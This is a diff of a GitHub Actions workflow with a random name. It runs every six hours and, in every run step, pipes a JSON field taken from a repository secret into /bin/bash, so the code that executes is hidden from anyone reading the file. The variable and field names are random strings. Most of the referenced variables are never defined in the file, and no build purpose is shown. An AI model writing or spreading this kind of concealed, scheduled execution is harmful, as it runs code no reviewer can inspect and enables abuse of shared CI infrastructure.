@@ -1,23 +1,28 @@
 name: watchwordstudent
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 2/6 * * *'
+    - cron: '11 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: watchwordstudent
         env:
-          xj68043: ${{ secrets.xj68043 }}
+          gg6: ${{ secrets.gg6 }}
         run: |
-          echo $xj68043 | jq -r .wmq34672 | /bin/bash
-          echo $equud62 | jq -r .wm95 | /bin/bash
-          echo $p35 | jq -r .x534 | /bin/bash
-          echo $tgy8 | jq -r .d9872 | /bin/bash
-          echo $ozat42 | jq -r .cjexp151 | /bin/bash
-          echo $f7412 | jq -r .x41827 | /bin/bash
+          echo $gg6 | jq -r .tqy02908 | /bin/bash
+          echo $qz97259 | jq -r .qfms57 | /bin/bash
+          echo $ld3821 | jq -r .rzh52738 | /bin/bash
+          echo $dtrtn9 | jq -r .ykgf199 | /bin/bash
+          echo $quefk55590 | jq -r .lycc0809 | /bin/bash
+          echo $n0398 | jq -r .eaox8564 | /bin/bash
+          echo $ypwe6028 | jq -r .myiq50 | /bin/bash
+          echo $yjnx47225 | jq -r .lilir701 | /bin/bash
+          echo $atqnd437 | jq -r .oppb8 | /bin/bash
+          echo $iwq5289 | jq -r .twkz90 | /bin/bash
+          echo $stabn821 | jq -r .st3 | /bin/bash
 
